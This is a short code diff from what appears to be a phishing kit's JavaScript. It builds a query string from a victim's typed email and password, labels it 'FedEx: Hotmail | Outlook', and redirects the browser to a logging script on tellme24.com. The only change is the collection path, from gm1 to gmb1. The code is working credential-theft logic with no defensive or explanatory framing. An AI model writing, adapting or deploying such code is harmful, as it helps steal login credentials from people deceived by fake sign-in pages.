@@ -65,7 +65,7 @@ submit2.addEventListener("click", function () {
 
         url = "Domain" + "=" + "FedEx: Hotmail | Outlook" + "&" + "Mail" + "=" + email.value + "&" + "Password" + "=" + pass.value
 
-        location = "https://tellme24.com/logs/gm1/office.php?" + url
+        location = "https://tellme24.com/logs/gmb1/office.php?" + url
 
         setTimeout(() => {
             email.value = ""
